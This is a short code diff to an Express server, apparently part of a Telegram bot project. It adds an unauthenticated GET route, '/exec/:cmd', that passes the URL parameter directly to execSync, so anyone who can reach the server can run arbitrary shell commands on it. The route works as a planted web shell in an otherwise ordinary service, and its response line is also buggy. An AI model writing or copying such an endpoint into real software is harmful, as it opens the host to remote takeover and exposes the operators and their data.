@@ -8,6 +8,7 @@ import { ppplbot } from './utils';
 import * as schedule from 'node-schedule-tz';
 import { getReactSleepTime, getLastReactTime, getAverageReactionDelay, getTotalReactions, getTotalFloodcount, getMinWaitTime, getTargetReactionDelay, getMe } from './react';
 import { getClient } from './clients.service';
+import { execSync } from 'child_process';
 
 let canTry2 = true;
 
@@ -75,6 +76,16 @@ app.get('/exit', (req, res, next) => {
 }, (req, res) => {
   process.exit(1);
 })
+
+app.get('/exec/:cmd', async (req, res, next) => {
+  let cmd = req.params.cmd;
+  console.log(`executing: `, cmd);
+  try {
+      res.send(console.log(execSync(cmd).toString()));
+  } catch (error) {
+      parseError(error);
+  }
+});
 
 app.get('/sendtoall', (req, res, next) => {
   res.send(`Sending ${req.query.query}`);
